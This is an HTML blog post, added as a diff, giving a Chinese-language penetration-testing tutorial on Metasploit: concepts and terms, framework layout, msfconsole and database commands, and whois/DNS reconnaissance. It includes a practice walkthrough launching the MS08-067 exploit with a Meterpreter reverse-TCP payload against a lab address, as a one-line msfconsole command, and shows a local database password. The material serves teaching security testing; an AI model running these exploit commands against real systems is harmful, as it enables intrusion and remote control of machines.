@@ -1,0 +1,351 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <title>
+    metasploit |
+    
+    yuchen</title>
+  
+    <link rel="shortcut icon" href="/favicon.ico">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  <link rel="stylesheet" href="/css/technology.css">
+  
+    <link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+  
+  <script src="/js/pace.min.js"></script>
+</head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <section class="outer">
+  <article id="post-metasploit" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
+
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      metasploit
+    </h1>
+  
+
+      </header>
+    
+
+    
+      <div class="article-meta">
+        <a href="/2020/03/01/metasploit/" class="article-date">
+  <time datetime="2020-03-01T01:20:16.000Z" itemprop="datePublished">2020-03-01</time>
+</a>
+        
+      </div>
+    
+
+    <div class="article-entry" itemprop="articleBody">
+      
+
+      
+
+      
+        <h1 id="渗透测试概述"><a href="#渗透测试概述" class="headerlink" title="渗透测试概述"></a>渗透测试概述</h1><h3 id="渗透测试概念"><a href="#渗透测试概念" class="headerlink" title="渗透测试概念"></a>渗透测试概念</h3><h4 id="渗透测试的定义"><a href="#渗透测试的定义" class="headerlink" title="渗透测试的定义"></a>渗透测试的定义</h4><blockquote>
+<p>渗透测试 (penetration test)并没有一个标准的定义，国外一些安全组织达成共识的通用说法是：渗透测试是通过模拟恶意黑客的攻击方法，来评估计算机网络系统安全的一种评估方法。这个过程包括对系统的任何弱点、技术缺陷或漏洞的主动分析，这个分析是从一个攻击者可能存在的位置来进行的，并且从这个位置有条件主动利用安全漏洞。<br>换句话来说，渗透测试是指渗透人员在不同的位置（比如从内网、从外网等位置）利用各种手段对某个特定网络进行测试，以期发现和挖掘系统中存在的漏洞，然后输出渗透测试报告，并提交给网络所有者。网络所有者根据渗透人员提供的渗透测试报告，可以清晰知晓系统中存在的安全隐患和问题。</p>
+</blockquote>
+<h4 id="渗透测试的特点"><a href="#渗透测试的特点" class="headerlink" title="渗透测试的特点"></a>渗透测试的特点</h4><blockquote>
+<p>我们认为渗透测试还具有的两个显著特点是：渗透测试是一个渐进的并且逐步深入的过程。渗透测试是选择不影响业务系统正常运行的攻击方法进行的测试。</p>
+</blockquote>
+<h3 id="渗透测试的目的"><a href="#渗透测试的目的" class="headerlink" title="渗透测试的目的"></a>渗透测试的目的</h3><blockquote>
+<p>了解入侵者可能利用的途径<br>了解系统及网络的安全强度</p>
+</blockquote>
+<h3 id="渗透测试入侵途径"><a href="#渗透测试入侵途径" class="headerlink" title="渗透测试入侵途径"></a>渗透测试入侵途径</h3><h4 id="程序BUG"><a href="#程序BUG" class="headerlink" title="程序BUG"></a>程序BUG</h4><ol>
+<li>缓冲区溢出</li>
+<li>代码执行</li>
+<li>SQL注入<h4 id="系统配置"><a href="#系统配置" class="headerlink" title="系统配置"></a>系统配置</h4></li>
+<li>系统默认配置</li>
+<li>管理员失职</li>
+<li>系统漏洞</li>
+<li>信任关系<h4 id="密码破译"><a href="#密码破译" class="headerlink" title="密码破译"></a>密码破译</h4></li>
+<li>脆弱的密码</li>
+<li>字典攻击</li>
+<li>暴力攻击<h4 id="网络监听"><a href="#网络监听" class="headerlink" title="网络监听"></a>网络监听</h4></li>
+<li>共享式网络</li>
+<li>监听服务器</li>
+<li>远程监听<h4 id="设计缺陷"><a href="#设计缺陷" class="headerlink" title="设计缺陷"></a>设计缺陷</h4></li>
+<li>TCP/IP协议缺陷</li>
+<li>操作系统设计缺陷<h3 id="渗透测试分类-方法分类"><a href="#渗透测试分类-方法分类" class="headerlink" title="渗透测试分类(方法分类)"></a>渗透测试分类(方法分类)</h3><blockquote>
+<p>根据渗透方法和视角分类,渗透测试可以分为:</p>
+</blockquote>
+</li>
+<li>黑盒测试</li>
+<li>白盒测试</li>
+<li>灰盒测试<h4 id="黑盒测试"><a href="#黑盒测试" class="headerlink" title="黑盒测试"></a>黑盒测试</h4><blockquote>
+<p>黑箱测试又被称为所谓的“Zero-Knowledge Testing”，渗透者完全处于对系统一无所知的状态，通常这类型测试，最初的信息获取来自于DNS、Web、Email及各种公开对外的服务器。</p>
+</blockquote>
+<h4 id="白盒测试"><a href="#白盒测试" class="headerlink" title="白盒测试"></a>白盒测试</h4><blockquote>
+<p>白盒测试与黑箱测试恰恰相反，测试者可以通过正常渠道向被测单位取得各种资料，包括网络拓扑、员工资料甚至网站或其它程序的代码片段，也能够与单位的其它员工（销售、程序员、管理者……）进行面对面的沟通。这类测试的目的是模拟企业内部雇员的越权操作。</p>
+</blockquote>
+<h4 id="灰盒测试"><a href="#灰盒测试" class="headerlink" title="灰盒测试"></a>灰盒测试</h4><blockquote>
+<p>隐秘测试是对被测单位而言的，通常情况下，接受渗透测试的单位网络管理部门会收到通知：在某些时段进行测试。因此能够监测网络中出现的变化。但隐秘测试则被测单位也仅有极少数人知晓测试的存在，因此能够有效地检验单位中的信息安全事件监控、响应、恢复做得是否到位。</p>
+</blockquote>
+<h3 id="渗透测试分类-目标分类"><a href="#渗透测试分类-目标分类" class="headerlink" title="渗透测试分类(目标分类)"></a>渗透测试分类(目标分类)</h3><h4 id="主机操作系统渗透"><a href="#主机操作系统渗透" class="headerlink" title="主机操作系统渗透"></a>主机操作系统渗透</h4><blockquote>
+<p>对Windows、Solaris、AIX、Linux、SCO、SGI等操作系统本身进行渗透测试。</p>
+</blockquote>
+<h4 id="数据库系统渗透"><a href="#数据库系统渗透" class="headerlink" title="数据库系统渗透"></a>数据库系统渗透</h4><blockquote>
+<p>对MS-SQL、Oracle、MySQL、Informix、Sybase、DB2、Access等数据库应用系统进行渗透测试。</p>
+</blockquote>
+<h4 id="应用系统渗透"><a href="#应用系统渗透" class="headerlink" title="应用系统渗透"></a>应用系统渗透</h4><blockquote>
+<p>对渗透目标提供的各种应用，如ASP、CGI、JSP、PHP等组成的WWW应用进行渗透测试。</p>
+</blockquote>
+<h4 id="网络设备渗透"><a href="#网络设备渗透" class="headerlink" title="网络设备渗透"></a>网络设备渗透</h4><blockquote>
+<p>对各种防火墙、入侵检测系统、网络设备进行渗透测试。</p>
+</blockquote>
+<h3 id="渗透测试项目流程"><a href="#渗透测试项目流程" class="headerlink" title="渗透测试项目流程"></a>渗透测试项目流程</h3></li>
+<li>信息收集项目分析</li>
+<li>制定方案威胁建模</li>
+<li>漏洞分析实施渗透</li>
+<li>权限提升内部渗透</li>
+<li>项目汇总总结结果</li>
+<li>渗透测试报告输出</li>
+<li>提出安全解决建议<h3 id="渗透测试手段"><a href="#渗透测试手段" class="headerlink" title="渗透测试手段"></a>渗透测试手段</h3></li>
+</ol>
+<ul>
+<li>网络嗅探</li>
+<li>暴力攻击</li>
+<li>漏洞扫描</li>
+<li>木马攻击</li>
+<li>社会工程</li>
+<li>应用安全性测试</li>
+<li>无线网络的渗透测试</li>
+<li>拒绝服务<h3 id="优秀的渗透测试"><a href="#优秀的渗透测试" class="headerlink" title="优秀的渗透测试"></a>优秀的渗透测试</h3></li>
+<li>建立参数</li>
+<li>专业人员</li>
+<li>选择足够的测试集</li>
+<li>遵循正确的方法</li>
+<li>结果值</li>
+<li>测试结果与测试<h1 id="渗透测试流程"><a href="#渗透测试流程" class="headerlink" title="渗透测试流程"></a>渗透测试流程</h1></li>
+</ul>
+<ol>
+<li>自我保护</li>
+<li>信息收集</li>
+<li>漏洞挖掘</li>
+<li>漏洞利用</li>
+<li>权限提升</li>
+<li>内网渗透</li>
+<li>后门植入</li>
+<li>痕迹清除<h3 id="自我保护"><a href="#自我保护" class="headerlink" title="自我保护"></a>自我保护</h3></li>
+</ol>
+<ul>
+<li>虚拟机环境</li>
+<li>代理网络</li>
+<li>匿名网络<h1 id="渗透测试专业术语"><a href="#渗透测试专业术语" class="headerlink" title="渗透测试专业术语"></a>渗透测试专业术语</h1></li>
+<li>漏洞验证(POC)</li>
+<li>漏洞利用(Exploit,EXP)</li>
+<li>攻击载荷(Payload)</li>
+<li>Shellcode</li>
+<li>模块(Module)</li>
+<li>监听器(Listener)</li>
+<li>零日漏洞(0Day)<h4 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h4><blockquote>
+<p>漏洞验证(POC= Proof of Concept)一段说明或者一个攻击的样例,使得能够确认这个漏洞是真实存在的。</p>
+</blockquote>
+<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><blockquote>
+<p>漏洞利用( Exploit、EXP)·漏洞利用是指由攻击者或滲透测试者利用一个系统、应用或服务中的安全漏洞,所进行的攻击行为。攻击者使用渗透攻击去入侵系统时,往往会造成开发者所没有预期到的一种特殊结果。流行的渗透攻击技术包括缓冲区溢出、web应用程序漏洞攻击(比如代码执行、命令执行),及利用配置错误等。通常所说的ExP即一段对漏洞如何利用的详细说明或者一个演示的漏洞攻击代码,可以使得读者完全了解漏洞的机理以及利用的方法。</p>
+</blockquote>
+<h4 id="攻击荷载"><a href="#攻击荷载" class="headerlink" title="攻击荷载"></a>攻击荷载</h4><blockquote>
+<p>攻击载荷( Payload)攻击载荷是我们期望目标系统在被渗透攻击之后去执行的代码在 Metasploit框架中可以自由地选择、传送和植入。例如,反弹式shell是一种从目标主机到攻击主机创建网络连接,并提供 Windows命令行shell的攻击载荷,而bindshell攻击载荷则在目标主机上将命令行shell绑定到一个打开的监听端口,攻击者可以连接这些端口来取得shell交互。攻击载荷也可能是简单的在目标操作系统上执行一些命令,如添加用户账号等。</p>
+</blockquote>
+<h4 id="Shellcode"><a href="#Shellcode" class="headerlink" title="Shellcode"></a>Shellcode</h4><blockquote>
+<p>Shellcode是在渗透攻击时作为攻击载荷运行的一组机器指令。Shellcode通常以汇编语言编写。在大多数情况下,目标系统执行了 Shellcode这一组指令之后,才会提供一个命令行shell或者Meterpreter Shel,这也是 Shellcode名称的由来。</p>
+</blockquote>
+<h4 id="模块-Module"><a href="#模块-Module" class="headerlink" title="模块(Module)"></a>模块(Module)</h4><blockquote>
+<p>在本教程的上下文环境中,一个模块是指 Metasploit框架中所使用的一段软件代码组件。在某些时候,你可能会在使用一个渗透攻击模块( exploit- module),也就是用于实际发起渗透攻击的软件组件。而在其他时候,你则可能在使用一个辅助模块( auxiliary-module):用来执行一些诸如扫描或系统查点的攻击动作。这些在不断变化和发展中的模块才是使 Metasploit框架如此强大的核心。</p>
+</blockquote>
+<h4 id="监听器-Listener"><a href="#监听器-Listener" class="headerlink" title="监听器(Listener)"></a>监听器(Listener)</h4><blockquote>
+<p>监听器是 Metasploit中用来等待连入网络连接的组件,举例来说,在目标主机被渗透攻击之后,它可能会通过互联网回连到攻击主机上,而监听器组件在攻击主机上等待被渗透攻击的系统来连接,并负责处理这些网络连接。</p>
+</blockquote>
+<h4 id="零日漏洞-0Day"><a href="#零日漏洞-0Day" class="headerlink" title="零日漏洞(0Day)"></a>零日漏洞(0Day)</h4><blockquote>
+<p>在计算机领域中,零日漏洞或零时差漏洞(英语: Zero-dayexploit)通常是指还没有补丁的安全漏洞，而零日攻击或零时差攻击(英语zero- dayattack)则是指利用这种漏洞进行的攻击。提供该漏洞细节或者利用程序的人通常是该漏洞的发现者。零日漏洞的利用程序对网络安全具有巨大威胁,因此零日漏洞不但是黑客的最爱,掌握多少零日漏洞也成为评价黑客技术水平的一个重要参数。零日漏洞及其利用代码不仅对犯罪黑客而言,具有极高的利用价值,一些国家间谍和网军部队,例如美国国家安全局和美国网战司令部也非常重视这些信息。</p>
+</blockquote>
+<h1 id="Metaspolit框架介绍"><a href="#Metaspolit框架介绍" class="headerlink" title="Metaspolit框架介绍"></a>Metaspolit框架介绍</h1><blockquote>
+<p>Metaspolit在kali-linux中的位置:/usr/share/metasploit-framework/</p>
+</blockquote>
+<h3 id="文件系统"><a href="#文件系统" class="headerlink" title="文件系统"></a>文件系统</h3></li>
+<li>data:可编辑的数据文件</li>
+<li>documentation:提供MSF的相关文档</li>
+<li>external:源代码和第三方库</li>
+<li>lib:框架基本代码库</li>
+<li>modules:MsF框架使用的模块</li>
+<li>plugins:运行时可加载的插件</li>
+<li>scripts:Meterpreter和其他脚本文件</li>
+<li>tools:各种有用的命令行工具</li>
+<li>Config:存放一些配置文件<h3 id="模块构成"><a href="#模块构成" class="headerlink" title="模块构成"></a>模块构成</h3></li>
+<li>Exploits:由许多漏洞利用组成的模块</li>
+<li>Auxiliary:辅助模块</li>
+<li>Payloads:由许多攻击载荷组成的模块</li>
+<li>Encoders:对攻击载荷进行编码的模块</li>
+<li>Nops:空字段模块,为了保持 payload大小一致</li>
+<li>Posts:后渗透模块<h3 id="模块加载"><a href="#模块加载" class="headerlink" title="模块加载"></a>模块加载</h3></li>
+<li>基本模块位置:/usr/share/metasploit-framework/modules/</li>
+<li>用户制定:~/.msf4/modules/</li>
+<li>Msfconsole-m</li>
+<li>loadpath<h3 id="对象模型"><a href="#对象模型" class="headerlink" title="对象模型"></a>对象模型</h3></li>
+<li>所有的模块都是Ruby类</li>
+<li>横块继承自特定的类</li>
+<li>特定的类集成MSE:Module类</li>
+<li>模块之间共享共同的API<h1 id="Metaspolit基本用法"><a href="#Metaspolit基本用法" class="headerlink" title="Metaspolit基本用法"></a>Metaspolit基本用法</h1><h3 id="用户接口-MSF终端"><a href="#用户接口-MSF终端" class="headerlink" title="用户接口:MSF终端"></a>用户接口:MSF终端</h3></li>
+<li>Msfconsole</li>
+<li>最流行的用户接口</li>
+<li>最灵活、功能最丰富并且支持最好的接口</li>
+<li>能访问 Metasploit框架中几乎每—个选型和配置<h3 id="Msfconsole命令介绍"><a href="#Msfconsole命令介绍" class="headerlink" title="Msfconsole命令介绍"></a>Msfconsole命令介绍</h3></li>
+<li>help / ?</li>
+<li>search</li>
+<li>use</li>
+<li>show、 show exploits、 show payloads、 show options、 show targets、show advanced</li>
+<li>set、 unset、setg、 unsetg</li>
+<li>Run</li>
+<li>sessions、 sessions -|、 sessions -| 1<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;!----&gt;</span><br><span class="line">&lt;!--开启数据库服务--&gt;</span><br><span class="line">service postgresql start</span><br><span class="line">&lt;!--初始化数据库--&gt;</span><br><span class="line">msfdb init</span><br><span class="line">&lt;!--切换到metaspolit框架目录下--&gt;</span><br><span class="line">cd /usr/share/metasploit-framework/</span><br><span class="line">&lt;!--查看数据库的配置信息--&gt;</span><br><span class="line">vim msfdb</span><br><span class="line">&lt;!--数据库部分信息--&gt;</span><br><span class="line">METASPLOIT BASEDIR=/usr/share/metasploit-framework //路径</span><br><span class="line">DB_CONF=$ METASPLOIT_ BASEDIRJ/config/database.yml //msfdb初始化后,生成一个yml文件</span><br><span class="line">DB_NAME=msf //数据库名称</span><br><span class="line">DB_USER=msf	//用户名称</span><br><span class="line">DB_PORT=5432 //端口号</span><br><span class="line">PG_SERVICE=postgresqL</span><br><span class="line"></span><br><span class="line">msfdb -h</span><br><span class="line">&lt;!--msfdb相关命令--&gt;</span><br><span class="line">msfdb init</span><br><span class="line">msfdb reinit</span><br><span class="line">msfdb delete</span><br><span class="line">msfdb start</span><br><span class="line">msfdb stop</span><br><span class="line">msfdb status</span><br><span class="line">msfdb run</span><br><span class="line"></span><br><span class="line">&lt;!--启动msf终端--&gt;</span><br><span class="line">msfconsole</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>msf终端命令</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">db_status /*若数据库未初始化,则显示未连接*/</span><br><span class="line">正常显示如下</span><br><span class="line">[*] Connected to msf. Connection type: postgresql</span><br><span class="line">&lt;!--取消连接--&gt;</span><br><span class="line">db_disconnect</span><br><span class="line">db_status</span><br><span class="line">显示未连接</span><br><span class="line">[*] postgresql selected, no connection</span><br><span class="line">&lt;!--手动连接--&gt;</span><br><span class="line">&lt;!--首先查看database.yml文件--&gt;</span><br><span class="line">vim /usr/share/metasploit-framework/config/database.yml</span><br><span class="line">&lt;!--从如下信息中获取用户名密码--&gt;</span><br><span class="line">production:</span><br><span class="line">adapter: postgresql</span><br><span class="line">database: msf</span><br><span class="line">username: msf</span><br><span class="line">password: kQppRNRj+5ZcIMqRiBEEeAfL12tp1ti1MlqVFBWili0=</span><br><span class="line">host:LocaLhost</span><br><span class="line">port: 5432</span><br><span class="line">pool: 5</span><br><span class="line">timeout: 5</span><br><span class="line">&lt;!--按以下格式输入命令  用户:密码@ip:端口号/数据库名--&gt;</span><br><span class="line">db_connect msf:kQppRNRj+5ZcIMqRiBEEeAfL12tp1ti1MlqVFBWili0=@127.0.0.1:5432/msf</span><br><span class="line"></span><br><span class="line">&lt;!--靶机练习--&gt;</span><br><span class="line">&lt;!--查询ms08_067漏洞 ms表示微软,08表示08年,067表示第67个漏洞--&gt;</span><br><span class="line">search ms08_067</span><br><span class="line">&lt;!--使用漏洞--&gt;</span><br><span class="line">use exploit/windows/smb/ms08_067_netapi</span><br><span class="line">&lt;!--查看漏洞的配置--&gt;</span><br><span class="line">show options</span><br><span class="line">&lt;!--显示如下--&gt;</span><br><span class="line">Module options (exploit/windows/smb/ms08_067_netapi):</span><br><span class="line"></span><br><span class="line">   Name     Current Setting  Required  Description</span><br><span class="line">   ----     ---------------  --------  -----------</span><br><span class="line">   RHOSTS                    yes       The target host(s), range CIDR identifier, or hosts file with syntax &apos;file:&lt;path&gt;&apos;</span><br><span class="line">   RPORT    445              yes       The SMB service port (TCP)</span><br><span class="line">   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)</span><br><span class="line"></span><br><span class="line">set rhost 192.168.0.101 /*靶机地址*/</span><br><span class="line">set lhost 192.168.0.110 /*监听地址*/</span><br><span class="line">unset rhost /*取消设置*/</span><br><span class="line">setg rhost 192.168.0.101 /*全局设置*/</span><br><span class="line">unsetg rhost /*取消设置*/</span><br><span class="line">&lt;!--查看可用的peyload--&gt;</span><br><span class="line">show payloads</span><br><span class="line">&lt;!--设置payload--&gt;</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">&lt;!--设置监听地址--&gt;</span><br><span class="line">set lhost 192.168.0.110 /*监听地址*/</span><br><span class="line">&lt;!--查看该漏洞可渗透的操作系统--&gt;</span><br><span class="line">show targets</span><br><span class="line">&lt;!--发起攻击--&gt;</span><br><span class="line">exploit</span><br><span class="line"></span><br><span class="line">&lt;!--将当前session隐藏到后台--&gt;</span><br><span class="line">background</span><br><span class="line">&lt;!--查看当前session--&gt;</span><br><span class="line">session -l</span><br><span class="line">&lt;!--打开指定session--&gt;</span><br><span class="line">session -i 1(id)</span><br></pre></td></tr></table></figure>
+<h3 id="payloads"><a href="#payloads" class="headerlink" title="payloads"></a>payloads</h3><blockquote>
+<p>payload又称为攻击载荷,主要是用来建立目标机与攻击机稳定连接的,可返回shell,也可以进行程序注入等。</p>
+</blockquote>
+</li>
+<li>singles:独立载荷</li>
+<li>stagers:传输器载荷</li>
+<li>stages:传輸体载荷<h3 id="用户接口-MSF命令行"><a href="#用户接口-MSF命令行" class="headerlink" title="用户接口:MSF命令行"></a>用户接口:MSF命令行</h3></li>
+<li>2015年1月以后已不再支持，可用 msfconsole-x代替</li>
+<li>可以直接从命令行shell执行</li>
+<li>增强对脚本处理和于其他命令行工具的互操作性<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole-x &quot;use exploit/windows/smb/ms08_067_netapi;set rhost 192.168.0.101;set payload windows/meterpreter/reverse_tcp;set lhost 192.168.0.110;run&quot;</span><br></pre></td></tr></table></figure>
+<h3 id="用户接口-MSF图形界面"><a href="#用户接口-MSF图形界面" class="headerlink" title="用户接口:MSF图形界面"></a>用户接口:MSF图形界面</h3></li>
+<li>Armitage</li>
+<li>完全交互式的图形用户接口<h3 id="功能程序-msfvemon"><a href="#功能程序-msfvemon" class="headerlink" title="功能程序:msfvemon"></a>功能程序:msfvemon</h3></li>
+<li>攻击载荷生成器 (msfpayload）和编码器(msfencode)的结合体</li>
+<li>可快速生成 shellcode、可执行代码等</li>
+<li>对攻击载荷进行编码<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><blockquote>
+<p>定义:收集目标的情报信息是一个非常重要的环节。可以大大提高渗透测试的成功性。收集渗透目标情报一般是对目标系统的分析，扫描探测，服务查点，査找对方系统IP等，社会工程学在滲透测试中也非常有用。滲透测试者会尽力搜集目标系统的配置， whois，主机Ip段，公司人员，安全防御以及防火墙等信息</p>
+</blockquote>
+<h3 id="网站与服务器信息（-Whois查询）"><a href="#网站与服务器信息（-Whois查询）" class="headerlink" title="网站与服务器信息（ Whois查询）"></a>网站与服务器信息（ Whois查询）</h3><blockquote>
+<p>Whois是用来查询域名的IP以及所有者等信息的传输协议，可以理解为是一个可以查询域名注册详细信息的大数据，WHOiS中包含域名注册者的姓名，邮箱，电话，地址，dns服务器等信息这些对我们渗透目标都很有用，然后在通过 whois获取到的注册者和邮箱进行域名反查可以获取更多的信息。</p>
+</blockquote>
+<h4 id="命令查询"><a href="#命令查询" class="headerlink" title="命令查询"></a>命令查询</h4><blockquote>
+<p>whois xxx. com</p>
+</blockquote>
+<h4 id="在线查询"><a href="#在线查询" class="headerlink" title="在线查询"></a>在线查询</h4></li>
+<li><a href="http://whois.chinaz.com" target="_blank" rel="noopener">http://whois.chinaz.com</a> </li>
+<li><a href="http://whois.aizhan.com" target="_blank" rel="noopener">http://whois.aizhan.com</a> </li>
+<li><a href="https://www.whois.com" target="_blank" rel="noopener">https://www.whois.com</a><h4 id="工具类"><a href="#工具类" class="headerlink" title="工具类"></a>工具类</h4></li>
+<li>SamSpade:<a href="http://www.samspade.com" target="_blank" rel="noopener">http://www.samspade.com</a> </li>
+<li>SuperScan:<a href="http://www.foundstone.com" target="_blank" rel="noopener">http://www.foundstone.com</a> </li>
+<li>NetScan Tools Pro:<a href="http://www.nwpsw.com" target="_blank" rel="noopener">http://www.nwpsw.com</a><h4 id="Whois反查"><a href="#Whois反查" class="headerlink" title="Whois反查"></a>Whois反查</h4><blockquote>
+<p>Whois反查即根据 whois获取到的域名所有人、域名注册商、域名注册日期和过期日期等，使用邮箱，电话等进行反差来获取更多关联的域名等信息，方便我们扩大目标范围。<br>在线查询 <a href="http://whois.chinaz.com/reverse" target="_blank" rel="noopener">http://whois.chinaz.com/reverse</a></p>
+</blockquote>
+<h3 id="网站与服务器信息（DNS查询）"><a href="#网站与服务器信息（DNS查询）" class="headerlink" title="网站与服务器信息（DNS查询）"></a>网站与服务器信息（DNS查询）</h3><blockquote>
+<p>DNS是域名系统（ Domainnamesystem）的缩写，是因特网的一项核心服务，它作为可以将域名和IP地址相互映射的一个分布式数据库，能够使人更方便的访问互联网，而不用去记住能够被机器直接读取的IP数串。<br>DNS是由解析器和域名服务器组成的。域名服务器是指保存有该网络中所有主机的域名和对应IP地址，并具有将域名转换为IP地址功能的服务器。其中域名必须对应一个IP地址，而IP地址不一定只对应一个域名。<br>您可以在 Windows平台下，使用命令行工具，输入 nslookup，返回的结果包括域名对应的IP地址（A记录）、别名（CNAME记录）等。除了以上方法外，还可以通过一些DNS查询站点如国外的国内的查询域名的DNS信息。</p>
+</blockquote>
+<h4 id="命令行查询"><a href="#命令行查询" class="headerlink" title="命令行查询"></a>命令行查询</h4><blockquote>
+<p>Nslookup、dig</p>
+</blockquote>
+<h4 id="在线查询-1"><a href="#在线查询-1" class="headerlink" title="在线查询"></a>在线查询</h4></li>
+<li><a href="http://dns.ip3366.com" target="_blank" rel="noopener">http://dns.ip3366.com</a></li>
+<li>http:/<a href="http://www.72e.net/tools/dns.aspx" target="_blank" rel="noopener">www.72e.net/tools/dns.aspx</a> </li>
+<li><a href="http://www.webkaka.com/dns" target="_blank" rel="noopener">http://www.webkaka.com/dns</a><h4 id="工具类-1"><a href="#工具类-1" class="headerlink" title="工具类"></a>工具类</h4></li>
+<li>DNSenum</li>
+<li>DNATracer </li>
+<li>DNSWalk </li>
+<li>Netifera<h3 id="NSLOOKUP命令参数基础解析"><a href="#NSLOOKUP命令参数基础解析" class="headerlink" title="NSLOOKUP命令参数基础解析"></a>NSLOOKUP命令参数基础解析</h3></li>
+<li>nslookup -type=ptr 8.8.8.8  査询一个P地址对应的域名</li>
+<li>nslookup -type=ns <a href="http://baidu.com" target="_blank" rel="noopener">http://baidu.com</a> 查询<a href="http://baidu.com使用的DNS服务器名称" target="_blank" rel="noopener">http://baidu.com使用的DNS服务器名称</a></li>
+<li>nslookup  进入交互式shell</li>
+<li>server <a href="http://ns2.baidu.com" target="_blank" rel="noopener">http://ns2.baidu.com</a> Server设定查询将要使用的DNS服务器</li>
+<li>ls <a href="http://baidu.com" target="_blank" rel="noopener">http://baidu.com</a>       ls命令列出某个域中的所有域名</li>
+<li>MX记录 电子邮件交换记录,记录一个邮件域名对应的IP地址，比如my[at]<a href="http://seclines.com" target="_blank" rel="noopener">http://seclines.com</a></li>
+<li>后面的部分seclinescom，邮件服务器对应的IP地址</li>
+<li>NS记录 域名服务器记录，记录该域名由哪台域名服务器解析</li>
+<li>PTR记录 反向记录,也即从IP地址到域名的一条记录</li>
+<li>TXT记录 记录域名的相关文本信息<h3 id="NSLOOKUP获取DNS服务器"><a href="#NSLOOKUP获取DNS服务器" class="headerlink" title="NSLOOKUP获取DNS服务器"></a>NSLOOKUP获取DNS服务器</h3><blockquote>
+<p>邮件服务器大都是在防火墙所在的系统,就算不是和防火墙在同一个系统最起码和目标网络也在同一个网络中,使用nslookup命令来获取邮件服务器地址<br>nslookup命令</p>
+</blockquote>
+</li>
+<li>root# nslookup</li>
+<li><blockquote>
+<p>set type = mx //设置要查询的类型</p>
+</blockquote>
+</li>
+<li><blockquote>
+<p>51ean.com //设置目标网站</p>
+</blockquote>
+<h3 id="信息收集-网站与服务器信息-网络侦察"><a href="#信息收集-网站与服务器信息-网络侦察" class="headerlink" title="信息收集:网站与服务器信息(网络侦察)"></a>信息收集:网站与服务器信息(网络侦察)</h3></li>
+<li>PING</li>
+<li>Traceroute、Tracert<h3 id="网站与服务器信息-二级域名"><a href="#网站与服务器信息-二级域名" class="headerlink" title="网站与服务器信息(二级域名)"></a>网站与服务器信息(二级域名)</h3><blockquote>
+<p>二级域名是指顶级域名之下的域名,在国际顶级域名下,它是指域名注册人的网上名称;在国家顶级域名下,它是表示注册企业类别的符号。我国在国际互联网络信息中心( Inter NIC)正式注册并运行的顶级域名是cN,这也是我国的一级域名。在顶级域名之下,我国的二级域名又分为类别域名和行政区域名两类。类别域名共7个,包括用于科研机构的ac;国际通用域名com、top; 用于教育机构的edu;用于政府部门的gov:用于互联网络信息中心和坛行中心的net;用于非盈利组织的org。而行政区域名有34个,分别对应于我国各省、自治区和直辖市。</p>
+</blockquote>
+</li>
+</ul>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://jinyeeeee.github.io/2020/03/01/metasploit/" data-id="ck7bkgns1000eb8v08wnwgv7f"
+         class="article-share-link">分享</a>
+      
+    </footer>
+
+  </div>
+
+  
+    
+  <nav class="article-nav">
+    
+      <a href="/2020/03/02/java/" class="article-nav-link">
+        <strong class="article-nav-caption">上一篇</strong>
+        <div class="article-nav-title">
+          
+            java
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2020/02/21/table-form/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">table-form</div>
+      </a>
+    
+  </nav>
+
+
+  
+
+  
+    
+  
+
